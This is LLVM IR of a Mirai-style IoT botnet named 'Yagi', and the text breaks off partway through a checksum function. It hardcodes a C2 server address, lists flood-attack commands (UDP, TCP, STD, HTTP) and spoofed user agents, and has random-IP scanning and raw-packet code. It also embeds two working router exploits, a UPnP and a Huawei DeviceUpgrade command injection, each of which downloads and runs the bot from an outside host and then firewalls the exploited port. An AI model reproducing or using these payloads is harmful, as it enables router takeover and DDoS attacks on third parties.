; ModuleID = 'host/ir_O1/Yagi.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.exploit_scanner_connection = type { i32, i32, i32, i32, i16, i32, [256 x i8], i8**, [2560 x i8], [2560 x i8], i32 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }

@c2_bot_port = local_unnamed_addr global i32 27, align 4
@c2_http_host = local_unnamed_addr global i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [15 x i8] c"185.244.25.149\00", align 1
@numattackpids = local_unnamed_addr global i64 0, align 8
@UserAgents = local_unnamed_addr global [39 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.39, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.2 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.3 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.4 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.5 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.6 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.7 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.8 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.9 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.10 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.11 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.12 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.13 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.14 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.15 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.16 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.17 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.18 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.20 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.21 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.22 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.23 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.24 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.25 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.27 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.28 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.30 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.31 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.32 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.33 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.34 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.35 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.36 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.37 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.38 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.39 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@attackpids = common local_unnamed_addr global i32* null, align 8
@retry = local_unnamed_addr global i32 1, align 4
@retrys = local_unnamed_addr global i32 3, align 4
@tryagain = local_unnamed_addr global i32 1, align 4
@max_attacks = local_unnamed_addr global i32 4, align 4
@maxboot_time = local_unnamed_addr global i32 600, align 4
@trigger = local_unnamed_addr global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i64 0, i64 0), align 8
@.str.54 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@C2 = local_unnamed_addr global i32 -1, align 4
@ioctl_pid = local_unnamed_addr global i32 0, align 4
@c2_host = common global [16 x i8] zeroinitializer, align 16
@Socket = common global %struct.sockaddr_in zeroinitializer, align 4
@buf = common global [1024 x i8] zeroinitializer, align 16
@buffer = common local_unnamed_addr global i32 0, align 4
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@pongresponse = common local_unnamed_addr global [25 x i8] zeroinitializer, align 16
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.40 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [19 x i8] c"Invalid flag \22%s\22\0A\00", align 1
@.str.50 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.53 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [15 x i8] c"arch yagi.%s\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [5 x i8] c"kill\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"stop\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"killattk\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"kt\00", align 1
@.str.60 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"udpflood\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"tcp\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"tcpflood\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"stdflood\00", align 1
@.str.66 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"httpflood\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.69 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.70 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"PONG\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [11 x i8] c"killc2proc\00", align 1
@exploit_scanner_pid = local_unnamed_addr global i32 0, align 4
@exploit_fake_time = local_unnamed_addr global i32 0, align 4
@conn_table = common local_unnamed_addr global %struct.exploit_scanner_connection* null, align 8
@exploit_rsck = local_unnamed_addr global i32 0, align 4
@exploit_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.73 = private unnamed_addr constant [920 x i8] c"POST /UD/?9 HTTP/1.1\0D\0AUser-Agent: SEFA\0D\0AContent-Type: text/xml\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://89.34.26.138/yagi.sh -O - > yagi.sh; chmod 777 yagi.sh; sh yagi.sh; rm yagi.sh; iptables -A INPUT -p tcp --destination-port 5555 -j DROP`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\00", align 1
@huawei_scanner_pid = local_unnamed_addr global i32 0, align 4
@huawei_fake_time = local_unnamed_addr global i32 0, align 4
@huawei_rsck = local_unnamed_addr global i32 0, align 4
@huawei_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.77 = private unnamed_addr constant [887 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AContent-Length: 430\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22><NewStatusURL>$(/bin/busybox wget -g 89.34.26.138 -l /tmp/yagi -r /bins/yagi.mips; /bin/busybox chmod 777 * /tmp/yagi; /tmp/yagi ; /bin/busybox iptables -A INPUT -p tcp --destination-port 37215 -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\0D\0A\0D\0A\00", align 1
@x = internal unnamed_addr global i32 0, align 4
@y = internal unnamed_addr global i32 0, align 4
@z = internal unnamed_addr global i32 0, align 4
@w = internal unnamed_addr global i32 0, align 4
@.str.84 = private unnamed_addr constant [15 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.1.85 = private unnamed_addr constant [20 x i8] c"M\06\07\14M\0F\0B\11\01M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.2.86 = private unnamed_addr constant [24 x i8] c"M\06\07\14M$65&6SRS=\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.3.87 = private unnamed_addr constant [25 x i8] c"M\06\07\14M$65&6SRS>B\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.4.88 = private unnamed_addr constant [16 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05Rb\00", align 1
@.str.5.89 = private unnamed_addr constant [23 x i8] c"M\07\16\01M\06\07\04\03\17\0E\16M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.6.90 = private unnamed_addr constant [16 x i8] c"M\11\00\0B\0CM\15\03\16\01\0A\06\0D\05b\00", align 1
@table = common local_unnamed_addr global [8 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -554832193, align 4
@switch.table = private unnamed_addr constant [3 x i32] [i32 -1677721600, i32 -989855744, i32 687865856]

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #12
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #3 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !1

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

